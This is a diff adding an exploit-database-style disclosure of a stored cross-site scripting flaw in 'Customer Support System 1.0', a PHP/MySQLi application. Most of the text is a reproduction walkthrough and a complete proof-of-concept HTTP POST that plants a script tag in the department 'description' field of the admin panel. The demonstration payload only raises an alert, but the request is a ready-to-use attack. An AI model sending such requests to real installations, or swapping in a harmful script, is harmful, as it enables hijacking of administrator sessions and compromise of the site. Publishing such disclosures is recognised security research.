@@ -1,0 +1,44 @@
+# Exploit Title: Customer Support System 1.0  - 'description' Stored XSS in The Admin Panel
+# Date: 2020-11-11
+# Exploit Author: Ahmed Abbas
+# Vendor Homepage: https://www.sourcecodester.com/php/14587/customer-support-system-using-phpmysqli-source-code.html
+# Software Link: https://www.sourcecodester.com/download-code?nid=14587&title=Customer+Support+System+using+PHP%2FMySQLi+with+Source+Code
+# Version: 1.0
+# Tested On: Windows 10 Pro 1909 (x64_86) + XAMPP 7.4.4
+
+
+Stored XSS Reproduction Steps:
+1. Navigate to http://TARGET/customer_support/index.php?page=department_list
+2. Click on new Department
+3. Add the XSS payload into the "description" parameter value
+4. Browse to the post to trigger the XSS payload
+
+# POC
+
+POST /customer_support/ajax.php?action=save_department HTTP/1.1
+Host: localhost
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:81.0) Gecko/20100101 Firefox/81.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+X-Requested-With: XMLHttpRequest
+Content-Type: multipart/form-data; boundary=---------------------------196034062430192961002574272606
+Content-Length: 445
+Origin: http://localhost
+Connection: close
+Referer: http://localhost/customer_support/index.php?page=department_list
+Cookie: PHPSESSID=6dbp44u1fs8f0ndfqutpn3lbuq
+
+-----------------------------196034062430192961002574272606
+Content-Disposition: form-data; name="id"
+
+4
+-----------------------------196034062430192961002574272606
+Content-Disposition: form-data; name="name"
+
+Stored xss
+-----------------------------196034062430192961002574272606
+Content-Disposition: form-data; name="description"
+
+<script>alert("STORED XSS")</script>
+-----------------------------196034062430192961002574272606--
